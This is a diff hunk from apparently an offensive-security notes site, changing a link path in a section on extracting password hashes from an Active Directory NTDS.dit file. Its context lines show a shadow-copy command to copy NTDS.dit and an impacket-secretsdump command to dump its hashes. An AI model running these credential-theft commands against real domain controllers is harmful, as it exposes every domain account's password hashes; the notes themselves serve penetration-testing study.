@@ -76,7 +76,7 @@ cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTD
 
 ### Extracting hashes from NTDS.dit
 
-> See how to get the `system` registry hive at [Credentials in Memory]({{< relref "7. Credential Looting/Credentials in Memory" >}})
+> See how to get the `system` registry hive at [Credentials in Memory]({{< relref "7. Post Exploitation/Credentials in Memory" >}})
 
 ```sh
 impacket-secretsdump -ntds NTDS.dit -system system LOCAL
